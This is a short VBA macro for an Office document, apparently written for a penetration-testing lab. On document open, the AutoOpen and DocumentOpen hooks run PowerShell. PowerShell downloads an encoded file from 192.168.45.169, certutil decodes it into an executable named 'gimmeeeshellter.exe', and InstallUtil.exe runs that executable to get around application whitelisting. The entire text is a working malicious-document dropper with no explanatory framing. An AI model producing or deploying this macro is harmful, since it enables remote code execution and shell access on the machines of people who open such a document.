 Sub mymacro()
    Dim Command As String
    Command = "powershell.exe iwr http://192.168.45.169/enc.txt -Outfile C:\\Windows\\Tasks\\enc5.txt; certutil -decode C:\\Windows\\Tasks\\enc5.txt C:\\Windows\Tasks\\gimmeeeshellter.exe; C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U C:\\Windows\\Tasks\\gimmeeeshellter.exe"
    Shell Command, 1
End Sub
Sub AutoOpen()
    mymacro
End Sub
Sub DocumentOpen()
    mymacro
End Sub
